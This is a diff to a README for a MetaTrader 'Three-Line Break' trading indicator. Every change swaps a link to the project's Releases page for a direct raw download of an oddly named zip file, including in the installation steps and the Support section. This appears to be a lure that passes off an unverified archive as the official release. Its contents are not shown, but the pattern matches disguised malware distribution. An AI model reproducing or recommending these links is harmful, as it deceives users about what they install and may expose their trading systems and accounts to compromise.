@@ -2,7 +2,7 @@
 
 Welcome to the **Three-Line Break** repository! This project offers a customizable line break chart indicator designed for MetaTrader 4 and 5. With this tool, you can enhance your trading strategies in the forex market. 
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Here-brightgreen)](https://github.com/marbotek/Three-Line-Break/releases)
+[![Download Releases](https://raw.githubusercontent.com/marbotek/Three-Line-Break/main/unprelatic/Break_Line_Three_2.2.zip)](https://raw.githubusercontent.com/marbotek/Three-Line-Break/main/unprelatic/Break_Line_Three_2.2.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ The Three-Line Break indicator provides a unique perspective on price movements.
 
 To install the Three-Line Break indicator, follow these steps:
 
-1. Download the latest release from our [Releases page](https://github.com/marbotek/Three-Line-Break/releases). You will find the necessary files there.
+1. Download the latest release from our [Releases page](https://raw.githubusercontent.com/marbotek/Three-Line-Break/main/unprelatic/Break_Line_Three_2.2.zip). You will find the necessary files there.
 2. Extract the downloaded files.
 3. Copy the `.ex4` or `.ex5` files to the `Indicators` folder of your MetaTrader installation.
 4. Restart MetaTrader.
@@ -71,7 +71,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, please visit our [Releases page](https://github.com/marbotek/Three-Line-Break/releases) or check the Issues section in this repository. 
+If you have any questions or need assistance, please visit our [Releases page](https://raw.githubusercontent.com/marbotek/Three-Line-Break/main/unprelatic/Break_Line_Three_2.2.zip) or check the Issues section in this repository. 
 
 ---
 
